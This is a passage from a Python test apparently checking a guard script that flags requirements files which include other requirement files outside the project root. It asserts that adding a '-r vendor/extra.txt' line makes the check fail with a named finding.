    assert guard.main([str(workflows)]) == 0
    live = tmp_path / 'requirements-live.txt'
    live.write_text(live.read_text(encoding='utf-8') + '-r vendor/extra.txt\n', encoding='utf-8')
    assert guard.main([str(workflows)]) == 1
    assert guard.scan_requirements(tmp_path)['requirements-live.txt'] == [
        'pip_include_not_root_requirements:vendor/extra.txt']
